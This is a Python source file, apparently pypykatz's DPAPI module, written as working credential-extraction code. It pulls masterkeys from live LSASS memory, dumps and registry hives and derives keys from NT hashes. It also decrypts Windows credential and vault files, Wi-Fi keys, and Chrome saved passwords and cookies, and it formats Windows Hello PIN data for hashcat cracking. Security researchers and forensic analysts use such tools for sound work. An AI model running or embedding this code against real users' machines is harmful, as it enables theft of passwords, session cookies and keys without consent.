import base64
import glob
import hmac
import json
import ntpath
import os
import platform
import sqlite3
import xml.etree.ElementTree as ET
from hashlib import sha1, pbkdf2_hmac, sha512

from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from unicrypto.hashlib import md4 as MD4
from unicrypto.symmetric import AES, MODE_GCM, MODE_CBC
from winacl.dtyp.wcee.cryptoapikey import CryptoAPIKeyProperties
from winacl.dtyp.wcee.pvkfile import PVKFile

from pypykatz import logger
from pypykatz.commons.common import UniversalEncoder, base64_decode_url
from pypykatz.dpapi.finders.cryptokeys import CryptoKeysFinder
from pypykatz.dpapi.finders.ngc import NGCProtectorFinder
from pypykatz.dpapi.structures.blob import DPAPI_BLOB
from pypykatz.dpapi.structures.credentialfile import CredentialFile, CREDENTIAL_BLOB
from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_KEYS

if platform.system().lower() == 'windows':
    from pypykatz.commons.winapi.processmanipulator import ProcessManipulator


class DPAPI:
    def __init__(self, use_winapi=False):
        self.use_winapi = use_winapi
        self.prekeys = {}

        self.masterkeys = {}
        self.backupkeys = {}

        self.vault_keys = []

    def dump_pre_keys(self, filename=None):
        if filename is None:
            for x in self.prekeys:
                print(x.hex())
        else:
            with open(filename, 'w', newline='') as f:
                for x in self.prekeys:
                    f.write(x.hex() + '\r\n')

    def load_prekeys(self, filename):
        try:
            open(filename, 'r')
        except Exception:
            key = bytes.fromhex(filename)
            self.prekeys[key] = 1
            return
        else:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    self.prekeys[bytes.fromhex(line)] = 1

    def dump_preferred_masterkey_guid(self, filename):
        from uuid import UUID

        with open(filename, 'rb') as f:
            b = f.read()[:16]

        guid = UUID(bytes_le=b)
        print('[GUID] %s' % guid)

    def dump_masterkeys(self, filename=None):
        if filename is None:
            for x in self.masterkeys:
                print('[GUID] %s [MASTERKEY] %s' % (x, self.masterkeys[x].hex()))
            for x in self.backupkeys:
                print('[GUID] %s [BACKUPKEY] %s' % (x, self.backupkeys[x].hex()))
        else:
            with open(filename, 'w', newline='') as f:
                t = {'masterkeys': self.masterkeys, 'backupkeys': self.backupkeys}
                f.write(json.dumps(t, cls=UniversalEncoder, indent=4, sort_keys=True))

    def load_masterkeys(self, filename):
        with open(filename, 'r') as f:
            data = json.loads(f.read())

        for guid in data['backupkeys']:
            self.backupkeys[guid] = bytes.fromhex(data['backupkeys'][guid])
        for guid in data['masterkeys']:
            self.masterkeys[guid] = bytes.fromhex(data['masterkeys'][guid])

    def get_prekeys_from_password(self, sid, password=None, nt_hash=None, sha1_hash=None):

        if password is None and nt_hash is None and sha1_hash is None:
            raise Exception('Provide either password, NT hash or SHA1 hash!')

        if password is None:

            if nt_hash and isinstance(nt_hash, str):
                nt_hash = bytes.fromhex(nt_hash)
            if sha1_hash and isinstance(sha1_hash, str):
                sha1_hash = bytes.fromhex(sha1_hash)

        key1 = key2 = key3 = key4 = None
        if password or password == '':
            ctx = MD4(password.encode('utf-16le'))
            nt_hash = ctx.digest()
            sha1_hash = sha1(password.encode('utf-16le')).digest()
        if sha1_hash:
            key1 = hmac.new(sha1_hash, (sid + '\0').encode('utf-16le'), sha1).digest()
            key4 = sha1_hash
        if nt_hash:
            key2 = hmac.new(nt_hash, (sid + '\0').encode('utf-16le'), sha1).digest()

            tmp_key = pbkdf2_hmac('sha256', nt_hash, sid.encode('utf-16le'), 10000)
            tmp_key_2 = pbkdf2_hmac('sha256', tmp_key, sid.encode('utf-16le'), 1)[:16]
            key3 = hmac.new(tmp_key_2, (sid + '\0').encode('utf-16le'), sha1).digest()[:20]

        count = 1
        for key in [key1, key2, key3, key4]:
            if key is not None:
                self.prekeys[key] = 1
                logger.debug('Prekey_%d %s %s %s %s' % (count, sid, password, nt_hash, key.hex()))
            count += 1

        return key1, key2, key3, key4

    def __get_registry_secrets(self, lr):

        user = []
        machine = []
        from pypykatz.registry.security.common import LSASecretDPAPI

        if lr.security:
            for secret in lr.security.cached_secrets:
                if isinstance(secret, LSASecretDPAPI):
                    logger.debug('[DPAPI] Found DPAPI user key in registry! Key: %s' % secret.user_key)
                    logger.debug('[DPAPI] Found DPAPI machine key in registry! Key: %s' % secret.machine_key)
                    self.prekeys[secret.user_key] = 1
                    user.append(secret.user_key)
                    self.prekeys[secret.machine_key] = 1
                    machine.append(secret.machine_key)

        if lr.sam is not None:
            for secret in lr.sam.secrets:
                if secret.nt_hash:
                    sid = '%s-%s' % (lr.sam.machine_sid, secret.rid)
                    x, key2, key3, y = self.get_prekeys_from_password(sid, nt_hash=secret.nt_hash)
                    logger.debug('[DPAPI] NT hash method. Calculated user key for user %s! Key2: %s Key3: %s' % (
                        sid, key2, key3))
                    user.append(key2)
                    user.append(key3)
                    continue

        return user, machine

    def get_prekeys_form_registry_live(self):

        from pypykatz.registry.live_parser import LiveRegistry
        from pypykatz.registry.offline_parser import OffineRegistry
        lr = None
        try:
            lr = LiveRegistry.go_live()
        except Exception:
            logger.debug('[DPAPI] Failed to obtain registry secrets via direct registry reading method')
            try:
                lr = OffineRegistry.from_live_system()
            except Exception:
                logger.debug('[DPAPI] Failed to obtain registry secrets via filedump method')

        if lr is not None:
            return self.__get_registry_secrets(lr)

        else:
            raise Exception('Registry parsing failed!')

    def get_prekeys_form_registry_files(self, system_path, security_path, sam_path=None):

        from pypykatz.registry.offline_parser import OffineRegistry
        lr = None
        try:
            lr = OffineRegistry.from_files(system_path, sam_path=sam_path, security_path=security_path)
        except Exception as e:
            logger.error('[DPAPI] Failed to obtain registry secrets via direct registry reading method. Reason: %s' % e)

        if lr is not None:
            return self.__get_registry_secrets(lr)

        else:
            raise Exception('[DPAPI] Registry parsing failed!')

    def get_all_keys_from_lsass_live(self):

        from pypykatz.pypykatz import pypykatz
        katz = pypykatz.go_live()
        sids = [katz.logon_sessions[x].sid for x in katz.logon_sessions]
        for x in katz.logon_sessions:
            for dc in katz.logon_sessions[x].dpapi_creds:
                logger.debug('[DPAPI] Got masterkey for GUID %s via live LSASS method' % dc.key_guid)
                self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)

            for package, _, _, nthex, lmhex, shahex, _, _, _, plaintext in katz.logon_sessions[x].to_grep_rows():
                if package.lower() == 'dpapi':
                    continue

                sids = [katz.logon_sessions[x].sid]
                for sid in sids:
                    if plaintext is not None:
                        self.get_prekeys_from_password(sid, password=plaintext, nt_hash=None)
                    if nthex is not None and len(nthex) == 32:
                        self.get_prekeys_from_password(sid, password=None, nt_hash=nthex)

                if shahex is not None and len(shahex) == 40:
                    self.prekeys[bytes.fromhex(shahex)] = 1

    def get_masterkeys_from_lsass_live(self):

        from pypykatz.pypykatz import pypykatz
        katz = pypykatz.go_live()
        for x in katz.logon_sessions:
            for dc in katz.logon_sessions[x].dpapi_creds:
                logger.debug('[DPAPI] Got masterkey for GUID %s via live LSASS method' % dc.key_guid)
                self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)

        return self.masterkeys

    def get_masterkeys_from_lsass_dump(self, file_path):

        from pypykatz.pypykatz import pypykatz
        katz = pypykatz.parse_minidump_file(file_path)
        for x in katz.logon_sessions:
            for dc in katz.logon_sessions[x].dpapi_creds:
                logger.debug('[DPAPI] Got masterkey for GUID %s via minidump LSASS method' % dc.key_guid)
                self.masterkeys[dc.key_guid] = bytes.fromhex(dc.masterkey)

        for package, _, _, nthex, lmhex, shahex, _, _, _, plaintext in katz.logon_sessions[x].to_grep_rows():
            if package.lower() == 'dpapi':
                continue

            sids = [katz.logon_sessions[x].sid]
            for sid in sids:
                if plaintext is not None:
                    self.get_prekeys_from_password(sid, password=plaintext, nt_hash=None)
                if nthex is not None and len(nthex) == 32:
                    self.get_prekeys_from_password(sid, password=None, nt_hash=nthex)

            if shahex is not None and len(shahex) == 40:
                self.prekeys[bytes.fromhex(shahex)] = 1

        return self.masterkeys

    def decrypt_masterkey_file_with_pvk(self, mkffile, pvkfile):

        with open(mkffile, 'rb') as fp:
            data = fp.read()
        mkf = MasterKeyFile.from_bytes(data)
        dk = mkf.domainkey.secret
        privkey = PVKFile.from_file(pvkfile).get_key()
        decdk = privkey.decrypt(dk[::-1], PKCS1v15())
        secret = decdk[8:72]
        self.masterkeys[mkf.guid] = secret
        return self.masterkeys

    def decrypt_masterkey_file(self, file_path, key=None):

        with open(file_path, 'rb') as f:
            mks, bks = self.decrypt_masterkey_bytes(f.read(), key=key)
            self.masterkeys.update(mks)
            self.masterkeys.update(bks)
            return mks, bks

    def decrypt_masterkey_directory(self, directory, ignore_errors: bool = True):

        for filename in glob.glob(os.path.join(directory, '**'), recursive=True):
            if os.path.isfile(filename):
                try:
                    self.decrypt_masterkey_file(filename)
                except Exception as e:
                    if ignore_errors is False:
                        raise e
                    logger.debug('Failed to decrypt %s Reason: %s' % (filename, e))
        return self.masterkeys

    def decrypt_masterkey_bytes(self, data, key=None):

        mkf = MasterKeyFile.from_bytes(data)
        mks = {}
        bks = {}
        if mkf.masterkey is not None:
            if mkf.guid in self.masterkeys:
                mks[mkf.guid] = self.masterkeys[mkf.guid]

            else:
                for user_key in self.prekeys:
                    dec_key = mkf.masterkey.decrypt(user_key)
                    if dec_key:
                        logger.debug('user key win: %s' % user_key.hex())
                        self.masterkeys[mkf.guid] = dec_key
                        mks[mkf.guid] = dec_key
                        break

                if key is not None:
                    dec_key = mkf.masterkey.decrypt(key)
                    if dec_key:
                        self.masterkeys[mkf.guid] = dec_key
                        mks[mkf.guid] = dec_key

        if mkf.backupkey is not None:
            if mkf.guid in self.masterkeys:
                mks[mkf.guid] = self.masterkeys[mkf.guid]

            else:
                for user_key in self.prekeys:
                    dec_key = mkf.backupkey.decrypt(user_key)
                    if dec_key:
                        self.backupkeys[mkf.guid] = dec_key
                        bks[mkf.guid] = dec_key
                        break

                if key is not None:
                    dec_key = mkf.backupkey.decrypt(key)
                    if dec_key:
                        self.masterkeys[mkf.guid] = dec_key
                        bks[mkf.guid] = dec_key

        return mks, bks

    def decrypt_credential_file(self, file_path):

        with open(file_path, 'rb') as f:
            return self.decrypt_credential_bytes(f.read())

    def get_key_for_blob(self, blob):

        if blob.masterkey_guid not in self.masterkeys:
            raise Exception('No matching masterkey was found for the blob!')
        return self.masterkeys[blob.masterkey_guid]

    def decrypt_credential_bytes(self, data, entropy=None):

        cred = CredentialFile.from_bytes(data)
        dec_data = self.decrypt_blob_bytes(cred.data, entropy=entropy)
        cb = CREDENTIAL_BLOB.from_bytes(dec_data)
        return cb

    def decrypt_blob(self, dpapi_blob, key=None, entropy=None):

        if key is None:
            logger.debug('[DPAPI] Looking for master key with GUID %s' % dpapi_blob.masterkey_guid)
            if dpapi_blob.masterkey_guid not in self.masterkeys:
                raise Exception('No matching masterkey was found for the blob!')
            key = self.masterkeys[dpapi_blob.masterkey_guid]
        return dpapi_blob.decrypt(key, entropy=entropy)

    def decrypt_blob_bytes(self, data, key=None, entropy=None):

        if self.use_winapi is True:
            from pypykatz.dpapi.functiondefs.dpapi import CryptUnprotectData
            return CryptUnprotectData(data)

        blob = DPAPI_BLOB.from_bytes(data)
        logger.debug(str(blob))
        return self.decrypt_blob(blob, key=key, entropy=entropy)

    def decrypt_vcrd_file(self, file_path):

        with open(file_path, 'rb') as f:
            return self.decrypt_vcrd_bytes(f.read())

    def decrypt_vcrd_bytes(self, data):

        vv = VAULT_VCRD.from_bytes(data)
        return self.decrypt_vcrd(vv)

    def decrypt_vcrd(self, vcrd):

        def decrypt_attr(attr, key):
            if attr.data is not None:
                if attr.iv is not None:
                    cipher = AES(key, MODE_CBC, attr.iv)
                else:
                    cipher = AES(key, MODE_CBC, b'\x00' * 16)

                cleartext = cipher.decrypt(attr.data)
                return cleartext

        res = {}
        for i, key in enumerate(self.vault_keys):
            for attr in vcrd.attributes:
                cleartext = decrypt_attr(attr, key)
                if attr not in res:
                    res[attr] = []
                res[attr].append(cleartext)
        return res

    def decrypt_vpol_bytes(self, data, entropy=None):

        vpol = VAULT_VPOL.from_bytes(data)
        res = self.decrypt_blob_bytes(vpol.blobdata, entropy=entropy)

        keys = VAULT_VPOL_KEYS.from_bytes(res)

        self.vault_keys.append(keys.key1.get_key())
        self.vault_keys.append(keys.key2.get_key())

        return keys.key1.get_key(), keys.key2.get_key()

    def decrypt_vpol_file(self, file_path):

        with open(file_path, 'rb') as f:
            return self.decrypt_vpol_bytes(f.read())

    def decrypt_securestring_bytes(self, data, entropy=None):
        return self.decrypt_blob_bytes(data, entropy=entropy)

    def decrypt_securestring_hex(self, hex_str):
        return self.decrypt_securestring_bytes(bytes.fromhex(hex_str))

    def decrypt_securestring_file(self, file_path):
        with open(file_path, 'r') as f:
            data = f.read()
        return self.decrypt_securestring_hex(data)

    @staticmethod
    def find_masterkey_files_live():
        windows_loc = DPAPI.get_windows_dir_live()
        user_folder = DPAPI.get_users_dir_live()

        return DPAPI.find_masterkey_files_offline(user_folder, windows_loc)

    @staticmethod
    def find_masterkey_files_offline(users_path, windows_path):
        def is_guid(fname):
            if os.path.isfile(filename) is True:
                base = ntpath.basename(filename)
                if base.find('-') == -1:
                    return False
                try:
                    bytes.fromhex(base.replace('-', ''))
                except:
                    return False
                return True
            return False

        masterkey_files = {}
        for filename in glob.glob(os.path.join(windows_path, "System32", "Microsoft", "Protect", "**"), recursive=True):
            if is_guid(filename) is True:
                logger.debug('GUID SYSTEM FILE: %s' % filename)
                masterkey_files[ntpath.basename(filename)] = filename

        user_folders = {}
        for filename in glob.glob(os.path.join(users_path, '*'), recursive=False):
            if os.path.isdir(filename):
                user_folders[filename] = 1

        for subfolder in ['Local', 'Roaming', 'LocalLow']:
            for user_folder in user_folders:
                for filename in glob.glob(os.path.join(user_folder, "AppData", subfolder, "Microsoft", "Protect", '**'),
                                          recursive=True):
                    if is_guid(filename) is True:
                        masterkey_files[ntpath.basename(filename)] = filename
                        logger.debug('GUID USER FILE: %s' % filename)

        return masterkey_files

    @staticmethod
    def get_users_dir_live():

        userprofile_loc = os.environ.get('USERPROFILE')
        username = os.environ.get('USERNAME')
        return userprofile_loc[:-len(username)]

    @staticmethod
    def get_windows_dir_live():
        return os.environ.get('SystemRoot')

    @staticmethod
    def get_windows_drive_live():
        return os.environ.get('SystemDrive')[0]

    @staticmethod
    def find_chrome_database_file_live():
        return DPAPI.find_chrome_database_file_offline(DPAPI.get_users_dir_live())

    @staticmethod
    def find_chrome_database_file_offline(users_path):
        db_paths = {}
        user_folders = {}

        for filename in glob.glob(os.path.join(users_path, '*'), recursive=False):
            if os.path.isdir(filename):
                username = ntpath.basename(filename)
                if username not in user_folders:
                    user_folders[username] = []
                user_folders[username].append(filename)

        for subfolder_1 in ['Local', 'Roaming', 'LocalLow']:
            for subfolder_2 in ['', 'Google']:
                for username in user_folders:
                    if username not in db_paths:
                        db_paths[username] = {}
                    for user_folder in user_folders[username]:
                        db_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome', 'User Data',
                                               'Default', 'Login Data')
                        if os.path.isfile(db_path) is True:
                            db_paths[username]['logindata'] = db_path
                            logger.debug('CHROME LOGINS DB FILE: %s' % db_path)

                        db_cookies_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome',
                                                       'User Data', 'Default', 'Cookies')
                        if os.path.isfile(db_cookies_path) is True:
                            db_paths[username]['cookies'] = db_cookies_path
                            logger.debug('CHROME COOKIES DB FILE: %s' % db_cookies_path)

                        localstate_path = os.path.join(user_folder, 'AppData', subfolder_1, subfolder_2, 'Chrome',
                                                       'User Data', 'Local State')
                        if os.path.isfile(localstate_path) is True:
                            db_paths[username]['localstate'] = localstate_path
                            logger.debug('CHROME localstate FILE: %s' % localstate_path)

        return db_paths

    @staticmethod
    def get_chrome_encrypted_secret(db_path, dbtype):
        results = {'logins': [], 'cookies': [], 'localstate': []}

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
        except Exception:
            logger.debug('Failed to open chrome DB file %s' % db_path)
            return results

        if dbtype.lower() == 'cookies':
            try:

                cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
            except Exception as e:
                logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
                return results

            for host_key, name, path, encrypted_value in cursor.fetchall():
                results['cookies'].append((host_key, name, path, encrypted_value))

        elif dbtype.lower() == 'logindata':

            try:

                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            except Exception as e:
                logger.debug('Failed perform query on chrome DB file %s Reason: %s' % (db_path, e))
                return results

            for url, user, enc_pw in cursor.fetchall():
                results['logins'].append((url, user, enc_pw))

        return results

    def decrypt_all_chrome_live(self):
        dbpaths = DPAPI.find_chrome_database_file_live()
        return self.decrypt_all_chrome(dbpaths)

    def decrypt_all_chrome(self, dbpaths, throw=False):
        results = {'logins': [], 'cookies': [], 'fmtcookies': []}
        localstate_dec = None

        for username in dbpaths:
            if 'localstate' in dbpaths[username]:
                with open(dbpaths[username]['localstate'], 'r') as f:
                    encrypted_key = json.load(f)['os_crypt']['encrypted_key']
                    encrypted_key = base64.b64decode(encrypted_key)

                try:
                    localstate_dec = self.decrypt_blob_bytes(encrypted_key[5:])
                except:
                    if throw is True:
                        raise Exception('LocalState decryption failed!')

                    continue
            if 'cookies' in dbpaths[username]:
                secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['cookies'], 'cookies')
                for host_key, name, path, encrypted_value in secrets['cookies']:
                    if encrypted_value.startswith(b'v10'):
                        nonce = encrypted_value[3:3 + 12]
                        ciphertext = encrypted_value[3 + 12:-16]
                        tag = encrypted_value[-16:]
                        cipher = AES(localstate_dec, MODE_GCM, IV=nonce, segment_size=16)
                        dec_val = cipher.decrypt(ciphertext, b'', tag)
                        results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val))
                        results['fmtcookies'].append(DPAPI.cookieformatter('https://' + host_key, name, path, dec_val))
                    else:
                        dec_val = self.decrypt_blob_bytes(encrypted_value)
                        results['cookies'].append((dbpaths[username]['cookies'], host_key, name, path, dec_val))
                        results['fmtcookies'].append(DPAPI.cookieformatter('https://' + host_key, name, path, dec_val))

            if 'logindata' in dbpaths[username]:
                secrets = DPAPI.get_chrome_encrypted_secret(dbpaths[username]['logindata'], 'logindata')
                for url, user, enc_password in secrets['logins']:
                    if enc_password.startswith(b'v10'):
                        nonce = enc_password[3:3 + 12]
                        ciphertext = enc_password[3 + 12:-16]
                        tag = enc_password[-16:]
                        cipher = AES(localstate_dec, MODE_GCM, IV=nonce, segment_size=16)
                        password = cipher.decrypt(ciphertext, b'', tag)
                        results['logins'].append((dbpaths[username]['logindata'], url, user, password))

                    else:
                        password = self.decrypt_blob_bytes(enc_password)
                        results['logins'].append((dbpaths[username]['logindata'], url, user, password))

        return results

    def get_all_masterkeys_live(self):
        try:
            self.get_all_keys_from_lsass_live()
        except:
            logger.debug('Failed to get masterkeys/prekeys from LSASS!')

        try:
            self.get_prekeys_form_registry_live()
        except Exception as e:
            logger.debug('Failed to get masterkeys/prekeys from registry!')

        mkfiles = DPAPI.find_masterkey_files_live()
        for guid in mkfiles:
            logger.debug('Decrypting masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
            mk, bk = self.decrypt_masterkey_file(mkfiles[guid])
            if len(mk) > 0 or len(bk) > 0:
                logger.debug('Decrypted masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))
            else:
                logger.debug('Failed to decrypt masterkeyfile with guid: %s location: %s' % (guid, mkfiles[guid]))

        return self.masterkeys, self.backupkeys

    @staticmethod
    def parse_wifi_config_file(filepath):
        wifi = {}
        tree = ET.parse(filepath)
        root = tree.getroot()

        for child in root:
            if child.tag.endswith('}name'):
                wifi['name'] = child.text
            elif child.tag.endswith('}MSM'):
                for pc in child.iter():
                    if pc.tag.endswith('}keyMaterial'):
                        wifi['enckey'] = pc.text
        return wifi

    @staticmethod
    def get_all_wifi_settings_offline(system_drive_letter):
        wifis = []
        for filename in glob.glob(system_drive_letter + ':\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\**',
                                  recursive=True):
            if filename.endswith('.xml'):
                wifi = DPAPI.parse_wifi_config_file(filename)
                wifis.append(wifi)
        return wifis

    @staticmethod
    def get_all_wifi_settings_live():
        return DPAPI.get_all_wifi_settings_offline(DPAPI.get_windows_drive_live())

    @staticmethod
    def strongentropy(password: str, entropy=None, dtype=2):

        res = b'' if entropy is None else entropy
        if dtype == 2:
            res += sha512(password.encode('utf-16-le')).digest()
        else:
            res += sha1(password.encode('utf-16-le')).digest()
        return res

    def decrypt_wifi_live(self):

        pm = ProcessManipulator()
        try:
            try:
                pm.getsystem()
            except Exception as e:
                raise Exception('Failed to obtain SYSTEM privileges! Are you admin? Error: %s' % e)

            for wificonfig in DPAPI.get_all_wifi_settings_live():
                yield self.decrypt_wifi_config_file_inner(wificonfig)

        finally:
            pm.dropsystem()

    def decrypt_wifi_config_file_inner(self, wificonfig):
        if 'enckey' in wificonfig and wificonfig['enckey'] != '':
            wificonfig['key'] = self.decrypt_securestring_hex(wificonfig['enckey'])
            return wificonfig

    def decrypt_wifi_config_file(self, configfile):
        wificonfig = DPAPI.parse_wifi_config_file(configfile)
        return self.decrypt_wifi_config_file_inner(wificonfig)

    @staticmethod
    def cookieformatter(host, name, path, content):

        return {
            "Host raw": host,
            "Name raw": name,
            "Path raw": path,
            "Content raw": content,
            "Expires": "26-05-2022 21:06:29",
            "Expires raw": "1653591989",
            "Send for": "Any type of connection",
            "Send for raw": False,
            "HTTP only raw": False,
            "SameSite raw": "lax",
            "This domain only": False,
            "This domain only raw": False,
            "Store raw": "firefox-default",
            "First Party Domain": "",
        }

    def decrypt_cloudap_key(self, keyvalue_url_b64):
        keyvalue = base64_decode_url(keyvalue_url_b64, bytes_expected=True)
        keyvalue = keyvalue[8:]
        key_blob = DPAPI_BLOB.from_bytes(keyvalue)
        return self.decrypt_blob(key_blob)

    def decrypt_cloudapkd_prt(self, PRT):
        prt_json = json.loads(PRT)
        keyvalue = prt_json.get('ProofOfPossesionKey', {}).get('KeyValue')
        if keyvalue is None:
            raise Exception('KeyValue not found in PRT')

        keyvalue_dec = self.decrypt_cloudap_key(keyvalue)
        return keyvalue_dec

    def winhello_pin_hash_offline(self, ngc_dir, cryptokeys_dir):

        results = []
        pin_guids = []
        for entry in NGCProtectorFinder.from_dir(ngc_dir):
            pin_guids.append(entry.guid)

        for entry in CryptoKeysFinder.from_dir(cryptokeys_dir):
            if entry.description in pin_guids:
                print(f'Found matching GUID: {entry.description}')
                properties_raw = self.decrypt_blob_bytes(entry.fields[1], entropy=b'6jnkd5J3ZdQDtrsu\x00')
                properties = CryptoAPIKeyProperties.from_bytes(properties_raw)
                blob = DPAPI_BLOB.from_bytes(entry.fields[2])

                salt = properties['NgcSoftwareKeyPbkdf2Salt'].value
                iterations = properties['NgcSoftwareKeyPbkdf2Round'].value

                entropy = b'\x78\x54\x35\x72\x5a\x57\x35\x71\x56\x56\x62\x72\x76\x70\x75\x41\x00'
                hashcat_format = f'$WINHELLO$*SHA512*{iterations}*{salt.hex()}*{blob.signature.hex()}*{self.get_key_for_blob(blob).hex()}*{blob.HMAC.hex()}*{blob.to_sign.hex()}*{entropy.hex()}'

                results.append(hashcat_format)
        return results


def prepare_dpapi_live(methods=[], mkf=None, pkf=None):
    dpapi = DPAPI()

    if mkf is not None:
        dpapi.load_masterkeys(mkf)
    if pkf is not None:
        dpapi.load_prekeys(mkf)

    if 'all' in methods:
        dpapi.get_all_masterkeys_live()
    if 'registry' in methods and 'all' not in methods:
        dpapi.get_prekeys_form_registry_live()
    if 'lsass' in methods and 'all' not in methods:
        dpapi.get_masterkeys_from_lsass_live()

    return dpapi


def main():
    mkffile = '/mnt/hgfs/!SHARED/feature/masterkeyfile - 170d0d57-e0ae-4877-bab6-6f5af49d3e8e'
    pvkfile = '/mnt/hgfs/!SHARED/feature/pvkfile - ntds_capi_0_fdf0c850-73d3-48cf-86b6-6beb609206c3.keyx.rsa.pvk'
    dpapi = DPAPI()
    dpapi.decrypt_mkf_with_pvk(mkffile, pvkfile)


if __name__ == '__main__':
    main()
